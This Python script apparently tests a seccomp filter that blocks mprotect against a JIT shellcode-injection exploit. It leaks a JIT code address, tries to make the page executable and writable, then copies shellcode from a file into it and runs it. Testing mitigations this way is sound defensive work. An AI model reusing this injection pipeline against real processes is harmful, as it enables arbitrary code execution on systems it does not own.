import ctypes
import jitexecleak

libsec = ctypes.CDLL("./secfilter.so")
assert libsec.install_seccomp() == 0
print("[+] seccomp-bpf with mprotect block installed")

# Run JIT exploit as usual
def hot_loop(x):
    total = 0
    for _ in range(100_000):
        total += x ^ 3
    return total

for _ in range(1000):
    hot_loop(42)

addr = jitexecleak.leak_executor_jit(hot_loop)
print(f"[+] executor->jit_code: 0x{addr:x}")

with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

PAGE_SIZE = 0x1000
libc = ctypes.CDLL("libc.so.6")
aligned = addr & ~(PAGE_SIZE - 1)
res = libc.mprotect(ctypes.c_void_p(aligned), PAGE_SIZE, 0x7)

if res != 0:
    print("[+] mprotect blocked by seccomp")
else:
    print("[-] mprotect unexpectedly succeeded")

ctypes.memmove(addr, shellcode, len(shellcode))
FUNC = ctypes.CFUNCTYPE(None)(addr)
print("[*] Executing shellcode...")
FUNC()
